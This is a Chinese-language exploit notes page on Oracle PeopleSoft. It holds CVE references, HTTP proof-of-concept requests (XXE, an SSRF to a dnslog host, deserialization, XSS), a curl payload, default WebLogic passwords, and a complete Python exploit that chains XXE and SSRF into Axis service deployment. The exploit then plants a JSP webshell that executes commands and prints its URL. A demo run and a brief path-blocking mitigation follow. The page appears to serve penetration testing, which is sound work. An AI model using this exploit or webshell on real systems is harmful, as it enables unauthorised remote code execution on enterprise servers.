### 参考
- [ORACLE PEOPLESOFT REMOTE CODE EXECUTION: BLIND XXE TO SYSTEM SHELL](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)
- [exploit-db CVE-2013-3821] [Oracle PeopleSoft Enterprise PeopleTools < 8.55 - Remote Code Execution Via Blind XML External Entity](https://www.exploit-db.com/exploits/43114)
- [exploit-db CVE-2017-10366][RCE vulnerability in monitor service of PeopleSoft 8.54, 8.55, 8.56](https://www.exploit-db.com/exploits/43594)
- [exploit-db CVE-2017-3548]['PeopleSoftServiceListeningConnector' XML External Entity via DOCTYPE in PeopleSoft 8.55](https://www.exploit-db.com/exploits/41925)
- [exploit-db CVE-2017-3546][SSRF in PeopleSoft 8.55 IMServlet ](https://www.exploit-db.com/exploits/42034)
- [[CVE-2017-10146] Directory Traversal and Authentication Bypass by Double encode in Portal of PeopleSoft 8.54, 8.55](https://erpscan.io/advisories/erpscan-17-040-anonymous-directory-traversal-vulnerability-double-encode-peoplesoft/)
- [[CVE-2017-10061] Directory Traversal and File Upload leading to RCE of PeopleSoft 8.54, 8.55](https://erpscan.io/advisories/erpscan-17-038-directory-traversal-vulnerability-integration-gateway-psigw/)
- https://erpscan.io/advisories/erpscan-18-001-information-disclosure-peoplesoft-listening-connector/
- https://erpscan.io/advisories/erpscan-17-039-file-upload-integration-gateway-psigw-peoplesoft/
- https://erpscan.io/advisories/erpscan-17-042-anonymous-log-injection-in-fscm/
- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-10-logging-security-events/
- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-9-insecure-trusted-connections/
- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-8-access-control-sod-conflicts/
- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-6-insecure-settings/
- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-5-open-remote-management-interfaces/
- https://erpscan.io/press-center/blog/eas-sec-oracle-peoplesoft-security-configuration-part-4-unnecessary-functionality/
- https://erpscan.io/press-center/blog/peoplesoft-security-part-2-decrypting-accessid/
- https://erpscan.io/press-center/blog/peoplesoft-security-part-3-peoplesoft-sso-tokenchpoken-attack/
- https://erpscan.io/press-center/blog/peoplesoft-security-part-4-peoplesoft-pentest-using-tokenchpoken-tool/
- https://erpscan.io/advisories/erpscan-17-023-crlf-injection-peoplesoft-imservlet/
- https://erpscan.io/press-center/blog/peoplesoft-security-configuration-part-2-patch-management/
- https://www.oracle.com/security-alerts/cpujul2017.html
- https://github.com/blazeinfosec/CVE-2017-10366_peoplesoft
- [Oracle PeopleSoft applications are under attacks!](https://conference.hitb.org/hitbsecconf2015ams/wp-content/uploads/2015/02/D1T2-Alexey-Tiurin-Oracle-Peoplesoft-Applications-are-Under-Attack.pdf)
- https://erpscan.io/advisories/erpscan-17-020-xxe-via-doctype-peoplesoft/
- https://erpscan.io/advisories/erpscan-17-022-ssrf-peoplesoft-imservlet/
- [PeopleSoft Security. Part 1: Overview of architecture](https://erpscan.io/press-center/blog/peoplesoft-security-part-1-overview-of-architecture/)



### 原理
- 利用[CVE-2013-3821]`/PSIGW/HttpListeningConnector`的XXE;
- 使用XXE的GET型SSRF的功能;
- 找到Axis服务:`/pspc/services`
- 网络访问Axis服务发现Axis需要认证401，转而尝试使用本地访问Axis
- 访问`/psp/ps/signon.html`，从响应的`Set-Cookie: xxx-80-PORTAL-PSJSESSIONID`中提取出localhost监听的Axis端口号: `80`
- 利用Axis的特性，将本需要用POST请求的部署Service的方式利用一个trick用GET型请求替代，实现了使用XXE(GET型SSRF)部署localhost的Axis的Service的目的
- 使用Axis的copy等指令将webshell转移到指定目录，实现webshell上传
- 访问webshell，实现RCE.


### 杂
- 获取版本号：`/PSEMHUB/hub`
- 找到site name/ID: `/`，匹配其结果`<a href="../ps/signon.html">`，这里就是`ps`

```
Human Resource Management Systems (HRMS)
Financial Management Solutions (FMS)
Supply Chain Management (SCM)
customer relationship management (CRM)
Enterprise Performance Management software (EPM)
```

>  PeopleSoft applications are quite complex and multi-component. Logically, their
security is not a simple thing either. 

Ref: 
- https://erpscan.io/wp-content/uploads/2017/10/Hack-and-Defense-Oracle-PeopleSoft-Security-Overview.pdf

### Attacks via WebLogic
> PS is usually installed together with the WebLogic application server. And this is how the system is accessible from the Internet.

>  WL + PS have several default user accounts: “system”, “operator”, “monitor”. The password is usually “password” or “Passw0rd”


### PoC
#### [CVE-2017-3546] SSRF in IMServlet(8.54, 8.55)
未复现成功。
```http
GET /IMServlet?Method=GOOGLE_PRESENCE&im_to_user=abc&im_server_name=GOOGLE&im_server=k57si0.dnslog.cn:80/?param=var
```

#### [CVE-2017-3548] XXE in PeopleSoftServiceListeningConnector(8.54, 8.55)
未复现成功。
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: 172.16.2.91:8000
Content-type: text/xml
<!DOCTYPE a PUBLIC "-//B/A/EN" "C:\windows">
```

#### [CVE-2013-3821]  Integration Gateway HttpListeningConnector XXE(8.51, 8.52, and 8.53?)
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://localhost:51420">
]>
<IBRequest>
   <ExternalOperationName>&x;</ExternalOperationName>
   <OperationType/>
   <From><RequestingNode/>
      <Password/>
      <OrigUser/>
      <OrigNode/>
      <OrigProcess/>
      <OrigTimeStamp/>
   </From>
   <To>
      <FinalDestination/>
      <DestinationNode/>
      <SubChannel/>
   </To>
   <ContentSections>
      <ContentSection>
         <NonRepudiation/>
         <MessageVersion/>
         <Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
         </Data>
      </ContentSection>
   </ContentSections>
</IBRequest>
```

#### [CVE-2017-10366] RCE vulnerability in monitor service of PeopleSoft 8.54, 8.55, 8.56
```http
POST /monitor/%SITE_NAME% HTTP/1.1
Host: PeopleSoft:PORT
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0)
Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Cookie:a=aa

§JAVA_SERIAL§

%SITE_NAME% - is a PeopleSoft "name" to get it you can use some information
```

#### [CVE-2018-2605] Information Disclosure of PeopleSoft 8.54, 8.55, 8.56
```http

POST http://<PEOPLESOFT_HOST>:8000/PSIGW/PeopleSoftListeningConnector
Content-Type: application/json
1
2
POST http://<PEOPLESOFT_HOST>:8000/PSIGW/PeopleSoftListeningConnector
Content-Type: application/json
-- response --
 
200 OK
Date: Fri, 16 Jun 2017 11:34:07 GMT
Content-Length: 675
Content-Type: text/plain; charset=UTF-8
Message-ID: 1133584668.1497612847565.JavaMail.Administrator@psfthcmwin <--!!! INFORMATION DISCLOSE
Date: Fri, 16 Jun 2017 04:34:07 -0700 (PDT)
Mime-Version: 1.0
Content-Type: multipart/related; 
boundary="----=_Part_95_86951755.1497612847564"
Content-ID: PeopleSoft-Integration-Broker-Internal-Mime-Message
------=_Part_95_86951755.1497612847564
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
Content-Disposition: inline
Content-ID: IBInfo
<?xml version="1.0"?>2015810408Integration Gateway Error
------=_Part_95_86951755.1497612847564--

```

#### [CVE-2017-10106] XSS of PeopleTools 8.54, 8.55
```
POST    /pspc/test?userID=<script>alert(1)</script>&password=<script>alert(2)</script>&languageCode==<script>alert(5)</script>&siteName=<script>alert(3)</script>&CREFName=<script>alert(4)</script>&portalName=<script>alert(6)</script>&command=login HTTP/1.1

```

ref: 
- https://erpscan.io/advisories/erpscan-17-037-multiple-xss-vulnerabilities-testservlet-peoplesoft/

#### 直接部署Service
```bash
curl -i -s -k -X $'POST'     -H $'Host: <ip>:<port>' -H $'Cookie: '     --data-binary $'<?xml version=\"1.0\"?><!DOCTYPE IBRequest [<!ENTITY x SYSTEM \"http://localhost:<port>/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22YZWXOUuHhildsVmHwIKdZbDCNmRHznXR%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.axis.client.ServiceFactory%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment\"> ]><IBRequest><ExternalOperationName>&x;</ExternalOperationName><OperationType/><From><RequestingNode/><Password/><OrigUser/><OrigNode/><OrigProcess/><OrigTimeStamp/></From><To><FinalDestination/><DestinationNode/><SubChannel/></To><ContentSections><ContentSection><NonRepudiation/><MessageVersion/><Data></Data></ContentSection></ContentSections></IBRequest>'     $'http://<ip>:<port>/PSIGW/HttpListeningConnector'
```
其他的class:
```
<?xml version="1.0"?><!DOCTYPE IBRequest [<!ENTITY x SYSTEM "http://333.cjmut0.dnslog.cn:8140/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22YZWXOUuHhildsVmHwIKdZbDCNmRHznXR%22+provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler+type%3D%22RandomLog%22%2F%3E%3C%2FrequestFlow%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22java.util.Random%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3Chandler+name%3D%22RandomLog%22+type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22+%3E%3Cparameter+name%3D%22LogHandler.fileName%22+value%3D%22.%2Fapplications%2Fpeoplesoft%2FPSOL%2Ftest1.jsp%22+%2F%3E%3Cparameter+name%3D%22LogHandler.writeToConsole%22+value%3D%22false%22+%2F%3E%3C%2Fhandler%3E%3C%2Fns1%3Adeployment"> ]><IBRequest><ExternalOperationName>&x;</ExternalOperationName><OperationType/><From><RequestingNode/><Password/><OrigUser/><OrigNode/><OrigProcess/><OrigTimeStamp/></From><To><FinalDestination/><DestinationNode/><SubChannel/></To><ContentSections><ContentSection><NonRepudiation/><MessageVersion/><Data></Data></ContentSection></ContentSections></IBRequest>
```

这里是部署`org.apache.axis.client.ServiceFactory`这个class。默认是`org.apache.pluto.portalImpl.Deploy`。


#### 完整exploit
```py
#!/usr/bin/python3
# Oracle PeopleSoft SYSTEM RCE
# https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
# cf
# 2017-05-17
# modified by shadowsock5 on 2020/12/10

import requests
import urllib.parse
import re
import string
import random
import sys


from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


try:
    import colorama
except ImportError:
    colorama = None
else:
    colorama.init()

    COLORS = {
        '+': colorama.Fore.GREEN,
        '-': colorama.Fore.RED,
        ':': colorama.Fore.BLUE,
        '!': colorama.Fore.YELLOW
    }


URL = sys.argv[1].rstrip('/')
CLASS_NAME = 'org.apache.pluto.portalImpl.Deploy'    # PeopleSoft’s pspc.war包里有的，而不是Axis通用的
PROXY = '192.168.85.1:8087'

# shell.jsp?c=whoami
PAYLOAD = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>'


class Browser:
    """Wrapper around requests.
    """

    def __init__(self, url):
        self.url = url
        self.init()

    def init(self):
        self.session = requests.Session()
        self.session.proxies = {
            'http': PROXY,
            'https': PROXY
        }
        self.session.headers={'Cookie': ''}   # 某些系统需要SSO才能访问，这里填Cookie
        self.session.verify = False

    def get(self, url ,*args, **kwargs):
        return self.session.get(url=self.url + url, proxies=self.session.proxies, *args, **kwargs)

    def post(self, url, *args, **kwargs):
        return self.session.post(url=self.url + url,proxies=self.session.proxies, *args, **kwargs)

    def matches(self, r, regex):
        return re.findall(regex, r.text)


class Recon(Browser):
    """Grabs different informations about the target.
    """

    def check_all(self):
        self.site_id = None
        self.local_port = None
        self.check_version()
        self.check_site_id()
        self.check_local_infos()

    def check_version(self):    # 查看版本
        """Grabs PeopleTools' version.
        """
        self.version = None
        r = self.get('/PSEMHUB/hub')
        m = self.matches(r, 'Registered Hosts Summary - ([0-9\.]+).</b>')

        if m:
            self.version = m[0]
            o(':', 'PTools version: %s' % self.version)
        else:
            o('-', 'Unable to find version')

    def check_site_id(self):  # 访问/ 其响应中的html通过正则匹配出site name/ID
        """Grabs the site ID and the local port.
        """
        if self.site_id:
            return

        r = self.get('/')
        m = self.matches(r, '/([^/]+)/signon.html')

        if not m:
            raise RuntimeError('Unable to find site ID')

        self.site_id = m[0]
        o('+', 'Site ID: ' + self.site_id)

    def check_local_infos(self):
        """Uses cookies to leak hostname and local port.
        """
        if self.local_port:
            return

        r = self.get('/psp/%s/signon.html' % self.site_id)

        for c, v in self.session.cookies.items():
            if c.endswith('-PORTAL-PSJSESSIONID'):   # 这里当Set-Cookie的值有多个-分割时可能有bug。待实际环境修改此处。
                #self.local_host, self.local_port, *_ = c.split('-')
                self.local_host, self.local_port = 'localhost','80'
                o('+', 'Target: %s:%s' % (self.local_host, self.local_port))
                return

        raise RuntimeError('Unable to get local hostname / port')


class AxisDeploy(Recon):
    """Uses the XXE to install Deploy, and uses its two useful methods to get
    a shell.
    """

    def init(self):
        super().init()
        self.service_name = 'YZWXOUuHhildsVmHwIKdZbDCNmRHznXR' #self.random_string(10)

    def random_string(self, size):
        return ''.join(random.choice(string.ascii_letters) for _ in range(size))

    def url_service(self, payload):
        return 'http://localhost:%s/pspc/services/AdminService?method=%s' % (
            self.local_port,
            urllib.parse.quote_plus(self.psoap(payload))
        )

    def war_path(self, name):
        # This is just a guess from the few PeopleSoft instances we audited.
        # It might be wrong.
        suffix = '.war' if self.version and self.version >= '8.50' else ''
        return './applications/peoplesoft/%s%s' % (name, suffix)

    def pxml(self, payload):    # 利用Axis的trick，将本需要POST发送的XML通过对应格式的GET请求发送出去
        """Converts an XML payload into a one-liner.
        """
        payload = payload.strip().replace('\n', ' ')
        payload = re.sub('\s+<', '<', payload, flags=re.S)
        payload = re.sub('\s+', ' ', payload, flags=re.S)
        print(payload)
        return payload

    def psoap(self, payload):
        """Converts a SOAP payload into a one-liner, including the comment trick
        to allow attributes.
        """
        payload = self.pxml(payload)
        payload = '!-->%s' % payload[:-1]
        return payload

    def soap_service_deploy(self):
        """SOAP payload to deploy the service.
        """
        return """
        <ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="%s" provider="java:RPC">
                <ns1:parameter name="className" value="%s"/>
                <ns1:parameter name="allowedMethods" value="*"/>
            </ns1:service>
        </ns1:deployment>
        """ % (self.service_name, CLASS_NAME)
        
    def soap_service_deploy2(self):
        """SOAP payload to deploy the service.
        """
        return """
        <ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
           <ns1:service name="%s" provider="java:RPC">
              <requestFlow>
                 <handler type="RandomLog"/>
             </requestFlow>
             <ns1:parameter name="className" value="java.util.Random"/>
             <ns1:parameter name="allowedMethods" value="*"/>
          </ns1:service>
          <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
             <parameter name="LogHandler.fileName" value="./applications/peoplesoft/PSOL/test1.jsp" />   
             <parameter name="LogHandler.writeToConsole" value="false" /> 
          </handler>
        </ns1:deployment>
        """ % (self.service_name)

    def soap_service_undeploy(self):
        """SOAP payload to undeploy the service.
        """
        return """
        <ns1:undeployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
        <ns1:service name="%s"/>
        </ns1:undeployment>
        """ % (self.service_name, )

    def xxe_ssrf(self, payload):
        """Runs the given AXIS deploy/undeploy payload through the XXE.
        """
        data = """
        <?xml version="1.0"?>
        <!DOCTYPE IBRequest [
        <!ENTITY x SYSTEM "%s">
        ]>
        <IBRequest>
           <ExternalOperationName>&x;</ExternalOperationName>
           <OperationType/>
           <From><RequestingNode/>
              <Password/>
              <OrigUser/>
              <OrigNode/>
              <OrigProcess/>
              <OrigTimeStamp/>
           </From>
           <To>
              <FinalDestination/>
              <DestinationNode/>
              <SubChannel/>
           </To>
           <ContentSections>
              <ContentSection>
                 <NonRepudiation/>
                 <MessageVersion/>
                 <Data>
                 </Data>
              </ContentSection>
           </ContentSections>
        </IBRequest>
        """ % self.url_service(payload)
        r = self.post(
            '/PSIGW/HttpListeningConnector',
            data=self.pxml(data),
            headers={
                'Content-Type': 'application/xml'
            }
        )

    def service_check(self):
        """Verifies that the service is correctly installed.
        """
        r = self.get('/pspc/services')
        return self.service_name in r.text

    def service_deploy(self):
        self.xxe_ssrf(self.soap_service_deploy())

        if not self.service_check():
            raise RuntimeError('Unable to deploy service')

        o('+', 'Service deployed')

    def service_undeploy(self):
        if not self.local_port:
            return

        self.xxe_ssrf(self.soap_service_undeploy())

        if self.service_check():
            o('-', 'Unable to undeploy service')
            return

        o('+', 'Service undeployed')

    def service_send(self, data):
        """Send data to the Axis endpoint.
        """
        return self.post(
            '/pspc/services/%s' % self.service_name,
            data=data,
            headers={
                'SOAPAction': 'useless',    # 这个头必须带，值是什么无所谓
                'Content-Type': 'application/xml'
            }
        )

    def service_copy(self, path0, path1):
        """Copies one file to another.
        """
        data = """
        <?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:copy
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <in0 xsi:type="xsd:string">%s</in0>
            <in1 xsi:type="xsd:string">%s</in1>
        </api:copy>
        </soapenv:Body>
        </soapenv:Envelope>
        """.strip() % (path0, path1)
        response = self.service_send(data)
        return '<ns1:copyResponse' in response.text

    def service_main(self, tmp_path, tmp_dir):
        """Writes the payload at the end of the .xml file.
        """
        data = """
        <?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0>
                <item xsi:type="xsd:string">%s</item>
                <item xsi:type="xsd:string">%s</item>
                <item xsi:type="xsd:string">%s.war</item>
                <item xsi:type="xsd:string">something</item>
                <item xsi:type="xsd:string">-addToEntityReg</item>
                <item xsi:type="xsd:string"><![CDATA[%s]]></item>
            </api:in0>
        </api:main>
        </soapenv:Body>
        </soapenv:Envelope>
        """.strip() % (tmp_path, tmp_dir, tmp_dir, PAYLOAD)
        response = self.service_send(data)

    def build_shell(self):
        """Builds a SYSTEM shell.
        """
        # On versions >= 8.50, using another extension than JSP got 70 bytes
        # in return every time, for some reason.
        # Using .jsp seems to trigger caching, thus the same pivot cannot be
        # used to extract several files.
        # Again, this is just from experience, nothing confirmed
        pivot = '/%s.jsp' % self.random_string(20)
        pivot_path = self.war_path('PSOL') + pivot
        pivot_url = '/PSOL' + pivot

        # 1: Copy portletentityregistry.xml to TMP

        per = '/WEB-INF/data/portletentityregistry.xml'
        per_path = self.war_path('pspc')
        tmp_path = '../' * 20 + 'TEMP'   # 这是Windows下的情况
        # tmp_path = '../' * 2 + 'TEMP'  # Linux下具体的个数视情况而定？
        tmp_dir = self.random_string(20)
        tmp_per = tmp_path + '/' + tmp_dir + per

        if not self.service_copy(per_path + per, tmp_per):
            raise RuntimeError('Unable to copy original XML file')

        # 2: Add JSP payload
        self.service_main(tmp_path, tmp_dir)

        # 3: Copy XML to JSP in webroot
        if not self.service_copy(tmp_per, pivot_path):
            raise RuntimeError('Unable to copy modified XML file')

        response = self.get(pivot_url)

        if response.status_code != 200:
            raise RuntimeError('Unable to access JSP shell')

        o('+', 'Shell URL: ' + self.url + pivot_url)


class PeopleSoftRCE(AxisDeploy):
    def __init__(self, url):
        super().__init__(url)


def o(s, message):
    if colorama:
        c = COLORS[s]
        s = colorama.Style.BRIGHT + COLORS[s] + '|' + colorama.Style.RESET_ALL
    print('%s %s' % (s, message))


x = PeopleSoftRCE(URL)

try:
    x.check_all()
    x.service_deploy()
    x.build_shell()
except RuntimeError as e:
    o('-', e)
finally:
    x.service_undeploy()
```

### Demo
```bash
~/repos/poc$ python3 peoplesolft.py http://perf.a.b.c.d
| PTools version: 8.52.06
| Site ID: ps
| Target: localhost:80
<ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/" xmlns:java="http://xml.apache.org/axis/wsdd/providers/java" xmlns:ns1="http://xml.apache.org/axis/wsdd/"><ns1:service name="YZWXOUuHhildsVmHwIKdZbDCNmRHznXR" provider="java:RPC"><ns1:parameter name="className" value="org.apache.pluto.portalImpl.Deploy"/><ns1:parameter name="allowedMethods" value="*"/></ns1:service></ns1:deployment>
<?xml version="1.0"?><!DOCTYPE IBRequest [<!ENTITY x SYSTEM "http://localhost:80/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22YZWXOUuHhildsVmHwIKdZbDCNmRHznXR%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment"> ]><IBRequest><ExternalOperationName>&x;</ExternalOperationName><OperationType/><From><RequestingNode/><Password/><OrigUser/><OrigNode/><OrigProcess/><OrigTimeStamp/></From><To><FinalDestination/><DestinationNode/><SubChannel/></To><ContentSections><ContentSection><NonRepudiation/><MessageVersion/><Data></Data></ContentSection></ContentSections></IBRequest>
| Service deployed
| Shell URL: http://perf.a.b.c.d/PSOL/randomxxx.jsp
<ns1:undeployment xmlns="http://xml.apache.org/axis/wsdd/" xmlns:ns1="http://xml.apache.org/axis/wsdd/"><ns1:service name="YZWXOUuHhildsVmHwIKdZbDCNmRHznXR"/></ns1:undeployment>
<?xml version="1.0"?><!DOCTYPE IBRequest [<!ENTITY x SYSTEM "http://localhost:80/pspc/services/AdminService?method=%21--%3E%3Cns1%3Aundeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22YZWXOUuHhildsVmHwIKdZbDCNmRHznXR%22%2F%3E%3C%2Fns1%3Aundeployment"> ]><IBRequest><ExternalOperationName>&x;</ExternalOperationName><OperationType/><From><RequestingNode/><Password/><OrigUser/><OrigNode/><OrigProcess/><OrigTimeStamp/></From><To><FinalDestination/><DestinationNode/><SubChannel/></To><ContentSections><ContentSection><NonRepudiation/><MessageVersion/><Data></Data></ContentSection></ContentSections></IBRequest>
| Service undeployed
```

![](https://raw.githubusercontent.com/shadowsock5/Poc/master/PeopleSoft/imgs/1613977109935_2.jpg)

### 缓解措施
由于没有分配CVE，不好找官方的修复建议和补丁之类的，只知道升级到最新版。在无法升级的情况下，因为XXE的利用点是`/PSIGW/HttpListeningConnector`，而部署Service的利用点是`/pspc/services`，所以作为临时措施，可以禁用以下路径：
```
- /PSIGW/HttpListeningConnector
- /pspc/services
- /pspc/services/*
- /PSOL/*
```
最后的是webshell的路径。
